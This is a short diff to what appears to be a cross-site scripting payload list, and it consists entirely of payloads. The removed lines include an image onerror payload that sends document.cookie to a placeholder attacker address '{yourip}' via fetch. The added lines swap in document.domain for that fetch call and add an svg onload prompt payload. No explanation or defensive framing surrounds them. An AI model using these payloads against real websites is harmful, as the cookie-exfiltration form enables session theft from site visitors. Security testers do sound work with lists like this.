@@ -1,2 +1,3 @@
-<img src=x onerror=alert(document.cookie)>
-<img src=x onerror=fetch('http://{yourip}/'+document.cookie);>
+<img src=x onerror=alert(document.domain)>
+<img src=x onerror=fetch('http://{yourip}/'+document.domain);>
+<svg/onload=prompt(document.domain);>
